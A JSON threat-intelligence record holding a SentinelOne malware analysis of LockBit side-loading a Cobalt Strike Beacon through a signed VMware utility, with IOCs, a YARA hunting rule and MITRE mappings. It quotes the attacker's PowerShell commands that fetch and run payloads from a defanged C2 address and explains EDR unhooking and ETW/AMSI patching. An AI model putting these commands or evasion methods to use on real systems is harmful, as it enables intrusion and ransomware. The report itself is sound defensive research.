@@ -1,0 +1,167 @@
+{
+    "id": "81d6a2e9-6cae-42ef-8229-e3a72eef3f89",
+    "created_at": "2023-01-12T15:06:56.759957Z",
+    "updated_at": "2025-03-27T02:17:01.463412Z",
+    "deleted_at": null,
+    "sha1_hash": "d8a413c9f49e2408416492eba61ef68e39b953d2",
+    "title": "2022-04-27 - LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
+    "authors": "",
+    "file_creation_date": "2022-08-18T03:26:27Z",
+    "file_modification_date": "2022-08-18T03:26:27Z",
+    "file_size": 3070429,
+    "plain_text": "# LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility\n\n**[sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility](https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility)**\n\nJames Haughom\n\n### By James Haughom, Júlio Dantas, and Jim Walter\n\n## Executive Summary\n\nThe VMware command line utility `VMwareXferlogs.exe used for data transfer to and`\nfrom VMX logs is susceptible to DLL side-loading.\nDuring a recent investigation, our DFIR team discovered that LockBit Ransomware-asa-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs\ncommand line utility.\nThe threat actor uses PowerShell to download the VMware xfer logs utility along with a\nmalicious DLL, and a `.log file containing an encrypted Cobalt Strike Reflective`\nLoader.\nThe malicious DLL evades defenses by removing EDR/EPP’s userland hooks, and\nbypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface\n(AMSI).\nThere are suggestions that the side-loading functionality was implemented by an\n[affiliate rather than the Lockbit developers themselves (via vx-underground), likely](https://twitter.com/vxunderground/status/1519817626943377432?s=21&t=EvK9hGcU2lZWSShi-U4u0A)\nDEV-0401.\n\n\n-----\n\n## Overview\n\nLockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019\n(previously known as “ABCD”). It commonly leverages the double extortion technique,\nemploying tools such as StealBit, WinSCP, and cloud-based backup solutions for data\nexfiltration prior to deploying the ransomware. Like most ransomware groups, LockBit’s postexploitation tool of choice is Cobalt Strike.\n\n[During a recent investigation, our DFIR team discovered an interesting technique used by](https://www.sentinelone.com/global-services/vigilance-respond-pro/)\n[LockBit Ransomware Group, or perhaps an affiliate, to load a Cobalt Strike Beacon](https://twitter.com/vxunderground/status/1519817626943377432?s=21&t=EvK9hGcU2lZWSShi-U4u0A)\nReflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon\nthrough a signed VMware xfer logs command line utility.\n\nSince our initial publication of this report, we have identified a connection with an affiliate\nMicrosoft tracks as [DEV-0401. A switch to LockBit represents a notable departure in DEV-](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/#NightSky)\n0401’s previously observed TTPs.\n\n[Side-loading is a DLL-hijacking technique used to trick a benign process into loading and](https://attack.mitre.org/techniques/T1574/002/)\nexecuting a malicious DLL by placing the DLL alongside the process’ corresponding EXE,\ntaking advantage of the DLL search order. In this instance, the threat actor used PowerShell\nto download the VMware xfer logs utility along with a malicious DLL, and a `.log file`\ncontaining an encrypted Cobalt Strike Reflective Loader. The VMware utility was then\nexecuted via `cmd.exe, passing control flow to the malicious DLL.`\n\nThe DLL then proceeded to evade defenses by removing EDR/EPP’s userland hooks, as\n[well as bypassing both Event Tracing for Windows (ETW) and](https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal) [Antimalware Scan Interface](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)\n(AMSI). The `.log file was then loaded in memory and decrypted via RC4, revealing a`\nCobalt Strike Beacon Reflective Loader. Lastly, a user-mode [Asynchronous Procedure Call](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)\n(APC) is queued, which is used to pass control flow to the decrypted Beacon.\n\n\n-----\n\n## Attack Chain\n\nThe attack chain began with several PowerShell commands executed by the threat actor to\ndownload three components, a malicious DLL, a signed VMwareXferlogs executable, and an\nencrypted Cobalt Strike payload in the form of a `.log file.`\n\n**Filename** **Description**\n\nglib-2.0.dll Weaponized DLL loaded by VMwareXferlogs.exe\n\nVMwareXferlogs.exe Legitimate/signed VMware command line utility\n\nc0000015.log Encrypted Cobalt Strike payload\n\nOur DFIR team recovered the complete PowerShell cmdlets used to download the\ncomponents from forensic artifacts.\n\n\n-----\n\n```\nInvoke WebRequest uri hxxp://45.32.108[.]54:443/glib 2.0.dll OutFile\nc:\\windows\\debug\\glib-2.0.dll;\n\nInvoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile\nc:\\windows\\debug\\c0000015.log;\n\nInvoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile\nc:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe\n\n```\nThe downloaded binary ( VMwareXferlogs.exe ) was then executed via the command\nprompt, with the STDOUT being redirected to a file.\n```\nc:\\windows\\debug\\VMwareXferlogs.exe 1>\n\n\\\\127.0.0.1\\ADMIN$\\__1649832485.0836577 2>&1\n\n\n```\nThe `VMwareXferlogs.exe is a legitimate, signed executable belonging to VMware.`\n\n\n-----\n\nVirusTotal Signature Summary\n[This utility is used to transfer data to and from VMX logs](https://kb.vmware.com/s/article/1019471)\n\n\n-----\n\nVMware xfer utility command line usage\nThis command line utility makes several calls to a third party library called `glib-2.0.dll .`\nBoth the utility and a legitimate version of `glib-2.0.dll are shipped with VMware`\ninstallations.\n\nglib-2.0.dll functions being called by VMwareXferlog.exe\nThe weaponized `glib-2.0.dll downloaded by the threat actor exports all the necessary`\nfunctions imported by `VMwareXferlog.exe .`\n\nExported functions of malicious glib-2.0.dll\n\n\n-----\n\nglib-2.0.dll-related functions imported by VMwareXferlog.exe\nCalls to exported functions from `glib-2.0.dll are made within the main function of the`\nVMware utility, the first being `g_path_get_basename() .`\n\nglib-2.0.dll functions being called by VMwareXferlog.exe\nNote that the virtual addresses for the exported functions are all the same for the\nweaponized `glib-2.0.dll (0x1800020d0), except for` `g_path_get_basename, which`\nhas a virtual address of 0x180002420. This is due to the fact that all exports, except for the\n```\ng_path_get_basename function do nothing other than call ExitProcess() .\n\n```\ng_error_free() function’s logic\nOn the other hand, `g_path_get_basename() invokes the malicious payload prior to exiting.`\n\n\n-----\n\nWhen `VMwareXferlog.exe calls this function, control flow is transferred to the malicious`\n```\nglib-2.0.dll, rather than the legitimate one, completing the side-loading attack.\n\n```\ng_path_get_basename() being called in the main() function\nOnce control flow is passed to the weaponized DLL, the presence of a debugger is checked\nby querying the `BeingDebugged flag and` `NtGlobalFlag in the` Process Environment\nBlock (PEB). If a debugger is detected, the malware enters an endless loop.\n\nAnti-debug mechanisms\n\n## Bypassing EDR/EPP Userland Hooks\n\nAt this juncture, the malware enters a routine to bypass any userland hooks by manually\nmapping itself into memory, performing a byte-to-byte inspection for any discrepancies\nbetween the copy of self and itself, and then overwriting any sections that have\ndiscrepancies.\n\nThis routine is repeated for all loaded modules, thus allowing the malware to identify any\npotential userland hooks installed by EDR/EPP, and overwrite them with the\nunpatched/unhooked code directly from the modules’ images on disk.\n\n\n-----\n\nChecking for discrepancies between on-disk and in-memory for each loaded module\nFor example, EDR’s userland NT layer hooks may be removed with this technique. The\nbelow subroutine shows a trampoline where a SYSCALL stub would typically reside, but\ninstead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to\nremove the hook.\n\nEDR-hooked SYSCALL stub that will be patched\nHere is a look at the patched code to restore the original SYSCALL stub and remove the\nEDR hook.\n\nNT layer hook removed and original code restored\nOnce these hooks are removed, the malware continues to evade defenses. Next, an attempt\nto bypass Event Tracing for Windows (ETW) commences through patching the\n```\nEtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related\n\n```\ntelemetry from being generated related to this process.\n\n\n-----\n\nEvent Tracing for Windows bypass\n[AMSI is bypassed the same way as ETW through patching](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) `AmsiScanBuffer . This halts`\nAMSI from inspecting potentially suspicious buffers within this process.\n\n\n-----\n\nAMSI bypass\nOnce these defenses have been bypassed, the malware proceeds to execute the final\npayload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4encrypted in the previously mentioned `c0000015.log file. The RC4 Key Scheduling`\nAlgorithm can be seen below with the hardcoded 136 byte key.\n\n\n-----\n\n```\n&.5 \\C3%YHO2SM &B3!XSY6SV)6(&7;(3.\n\n$F2WAED>>;K]8\\*D#[email protected](R,+]A-G\\D\n\nHERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'\n\n4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V[\n\n```\nRC4 Key Scheduling Algorithm\nThe RC4 decryption of the payload then commences.\n\n\n-----\n\nRC4 decryption routine\nThe final result is Beacon’s Reflective Loader, seen below with the familiar magic bytes and\nhardcoded strings.\n\n\n-----\n\nDecrypted Cobalt Strike Beacon Reflective Loader\nOnce decrypted, the region of memory that the payload resides in is made executable\n(PAGE_EXECUTE_READWRITE), and a new thread is created for this payload to run within.\n\nThis thread is created in a suspended state, allowing the malware to add a user-mode APC,\npointing to the payload, to the newly created thread’s APC queue. Finally, the thread is\nresumed, allowing the thread to run and execute the Cobalt Strike payload via the APC.\n\nLogic to queue and execute user-mode APC\nThe DLL is detected by the SentinelOne agent prior to being loaded and executed.\n\n\n-----\n\nDetection for LockBit DLL\n\n## VMware Side-loading Variants\n\nA handful of samples related to the malicious DLL were discovered by our investigation. The\nonly notable differences being the RC4 key and name of the file containing the RC4encrypted payload to decrypt.\n\nFor example, several of the samples attempt to load the file `vmtools.ini rather than`\n```\nc0000015.log .\n\n```\nThe vmtools.ini file being accessed by a variant\nAnother variant shares the same file name to load `vmtools.ini, yet is packed with a`\ncustom version of UPX.\n\n\n-----\n\nTail jump at the end of the UPX unpacking stub\n\n## Conclusion\n\nThe VMware command line utility `VMwareXferlogs.exe used for data transfer to and from`\nVMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat\nactor had created a malicious version of the legitimate `glib-2.0.dll to only have code`\nwithin the `g_path_get_basename() function, while all other exports simply called`\n```\nExitProcess() . This function invokes a malicious payload which, among other things,\n\n```\nattempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.\n\nLockBit continues to be a successful RaaS and the developers are clearly innovating in\nresponse to EDR/EPP solutions. We hope that by describing this latest technique, defenders\nand security teams will be able to improve their ability to protect their organizations.\n\n## Indicators of Compromise\n\n**SHA1** **Description**\n\n729eb505c36c08860c4408db7be85d707bdcbf1b Malicious glib-2.0.dll from investigation\n\n091b490500b5f827cc8cde41c9a7f68174d11302 Decrypted Cobalt Strike payload\n\n\n-----\n\ne35a702db47cb11337f523933acd3bce2f60346d Encrypted Cobalt Strike payload –\nc0000015.log\n\n25fbfa37d5a01a97c4ad3f0ee0396f953ca51223 glib-2.0.dll vmtools.ini variant\n\n0c842d6e627152637f33ba86861d74f358a85e1f glib-2.0.dll vmtools.ini variant\n\n1458421f0a4fe3acc72a1246b80336dc4138dd4b glib-2.0.dll UPX-packed vmtools.ini\nvariant\n\n**File Path** **Description**\n\nc:\\windows\\debug\\VMwareXferlogs.exe Full path to legitimate VMware command line\nutility\n\nc:\\windows\\debug\\glib-2.0.dll Malicious DLL used for hijack\n\nc:\\windows\\debug\\c0000015.log Encrypted Cobalt Strike reflective loader\n\n**C2** **Description**\n\n149.28.137[.]7 Cobalt Strike C2\n\n45.32.108[.]54 Attacker C2\n\n## YARA Hunting Rules\n\n\n-----\n\n```\nimport pe\n\nrule Weaponized_glib2_0_dll\n\n{\n\n     meta:\n\n          description = \"Identify potentially malicious versions of glib2.0.dll\"\n\n          author = \"James Haughom @ SentinelOne\"\n\n          date = \"2022-04-22\"\n\n          reference = \"https://www.sentinelone.com/labs/lockbit-ransomwareside-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/\"\n\n     /*\n\n          The VMware command line utilty 'VMwareXferlogs.exe' used for data\n\n          transfer to/from VMX logs is susceptible to DLL sideloading. The\n          malicious versions of this DLL typically only have code within\n\n          the function 'g_path_get_basename()' properly defined, while the\n          rest will of the exports simply call 'ExitProcess()'. Notice how\n\n          in the exports below, the virtual address for all exported functions\n\n          are the same except for 'g_path_get_basename()'. We can combine this\n\n          along with an anomalously low number of exports for this DLL, as\n          legit instances of this DLL tend to have over 1k exports.\n\n          [Exports]\n\n          nth paddr   vaddr    bind  type size lib     name\n\n          ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――\n\n          1  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll g_error_free\n\n          2  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll g_free\n\n          3  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll\ng_option_context_add_main_entries\n\n          4  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll\ng_option_context_free\n\n          5  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll\ng_option_context_get_help\n\n          6  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll\ng_option_context_new\n\n          7  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll\ng_option_context_parse\n\n          8  0x00001820 0x180002420 GLOBAL FUNC 0  glib-2.0.dll\ng_path_get_basename\n\n          9  0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll g_print\n          10 0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll g_printerr\n\n          11 0x000014d0 0x1800020d0 GLOBAL FUNC 0  glib-2.0.dll\ng_set_prgname\n\n\n          This rule will detect malicious versions of this DLL by identifying\n\n          if the virtual address is the same for all of the exported functions\n\n          used by 'VMwareXferlogs.exe' except for 'g_path_get_basename()'.\n     */\n\n\n```\n\n-----\n\n```\n     condition:\n\n          /* sample is an unsigned DLL */\n\n          pe.characteristics & pe.DLL and pe.number_of_signatures == 0 and\n\n          /* ensure that we have all of the exported functions of glib-2.0.dll\nimported by VMwareXferlogs.exe */\n\n          pe.exports(\"g_path_get_basename\") and\n\n          pe.exports(\"g_error_free\") and\n\n          pe.exports(\"g_free\") and\n\n          pe.exports(\"g_option_context_add_main_entries\") and\n\n          pe.exports(\"g_option_context_get_help\") and\n\n          pe.exports(\"g_option_context_new\") and\n\n          pe.exports(\"g_print\") and\n\n          pe.exports(\"g_printerr\") and\n\n          pe.exports(\"g_set_prgname\") and\n\n          pe.exports(\"g_option_context_free\") and\n\n          pe.exports(\"g_option_context_parse\") and\n\n          /* all exported functions have the same offset besides\ng_path_get_basename */\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_error_free\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_option_context_get_help\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_option_context_new\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_option_context_add_main_entries\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_print\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_printerr\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_set_prgname\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_option_context_free\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset ==\npe.export_details[pe.exports_index(\"g_option_context_parse\")].offset and\n\n          pe.export_details[pe.exports_index(\"g_free\")].offset !=\npe.export_details[pe.exports_index(\"g_path_get_basename\")].offset and\n\n          /* benign glib-2.0.dll instances tend to have ~1k exports while\nmalicious ones have the bare minimum */\n\n          pe.number_of_exports < 15\n\n}\n\n\n## MITRE ATT&CK TTPs\n\n```\n**TTP** **MITRE ID**\n\n\n-----\n\nEncrypted Cobalt Strike payload [T1027](https://attack.mitre.org/techniques/T1027/)\n\nDLL Hijacking [T1574](https://attack.mitre.org/techniques/T1574/)\n\nETW Bypass [T1562.002](https://attack.mitre.org/techniques/T1562/002/)\n\nAMSI Bypass [T1562.002](https://attack.mitre.org/techniques/T1562/002/)\n\nUnhooking EDR [T1562.001](https://attack.mitre.org/techniques/T1562/001/)\n\nEncrypted payload [T1027.002](https://attack.mitre.org/techniques/T1027/002/)\n\nPowershell usage [T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\nCobalt Strike [S0154](https://attack.mitre.org/software/S0154/)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-27 - LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility.pdf"
+    ],
+    "report_names": [
+        "2022-04-27 - LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "81e29474-63ad-4ce8-97db-b1712d5481d5",
+            "created_at": "2024-04-24T02:00:49.570158Z",
+            "updated_at": "2025-03-27T02:00:55.49842Z",
+            "deleted_at": null,
+            "main_name": "Cinnamon Tempest",
+            "aliases": [
+                "Cinnamon Tempest",
+                "DEV-0401",
+                "Emperor Dragonfly",
+                "BRONZE STARLIGHT"
+            ],
+            "source_name": "MITRE:Cinnamon Tempest",
+            "tools": [
+                "Pandora",
+                "PlugX",
+                "Cheerscrypt",
+                "Impacket",
+                "Cobalt Strike",
+                "HUI Loader",
+                "Rclone"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "6eabf1ca-1d3a-4c27-893e-c4e0eb58e285",
+            "created_at": "2024-06-04T02:03:07.737006Z",
+            "updated_at": "2025-03-27T02:05:17.29122Z",
+            "deleted_at": null,
+            "main_name": "BRONZE STARLIGHT",
+            "aliases": [
+                "DEV-0401 "
+            ],
+            "source_name": "Secureworks:BRONZE STARLIGHT",
+            "tools": [
+                " Cobalt Strike",
+                " HUI Loader",
+                " LockFile",
+                " NightSky",
+                " Pandora",
+                " PlugX",
+                " Rook",
+                "AtomSilo"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "f63c346d-18c8-4821-a56d-fefb1ad7ed5d",
+            "created_at": "2022-10-25T16:07:23.42507Z",
+            "updated_at": "2025-03-27T02:02:09.793332Z",
+            "deleted_at": null,
+            "main_name": "Bronze Starlight",
+            "aliases": [
+                "Cinnamon Tempest",
+                "DEV-0401",
+                "Operation ChattyGoblin",
+                "SLIME34"
+            ],
+            "source_name": "ETDA:Bronze Starlight",
+            "tools": [
+                "Agent.dhwf",
+                "Agentemis",
+                "AtomSilo",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Destroy RAT",
+                "DestroyRAT",
+                "HUI Loader",
+                "Kaba",
+                "Korplug",
+                "LockFile",
+                "Night Sky",
+                "NightSky",
+                "Pandora",
+                "PlugX",
+                "RedDelta",
+                "Sogu",
+                "TIGERPLUG",
+                "TVT",
+                "Thoper",
+                "Xamtrav",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "c69bcda3-0893-4ea1-9ec1-ae016332d283",
+            "created_at": "2023-01-06T13:46:39.410593Z",
+            "updated_at": "2025-03-27T02:00:03.081388Z",
+            "deleted_at": null,
+            "main_name": "BRONZE STARLIGHT",
+            "aliases": [
+                "DEV-0401",
+                "Cinnamon Tempest",
+                "Emperor Dragonfly",
+                "SLIME34"
+            ],
+            "source_name": "MISPGALAXY:BRONZE STARLIGHT",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536016,
+    "ts_updated_at": 1743041821,
+    "ts_creation_date": 1660793187,
+    "ts_modification_date": 1660793187,
+    "files": {
+        "pdf": "https://archive.orkl.eu/d8a413c9f49e2408416492eba61ef68e39b953d2.pdf",
+        "text": "https://archive.orkl.eu/d8a413c9f49e2408416492eba61ef68e39b953d2.txt",
+        "img": "https://archive.orkl.eu/d8a413c9f49e2408416492eba61ef68e39b953d2.jpg"
+    }
+}
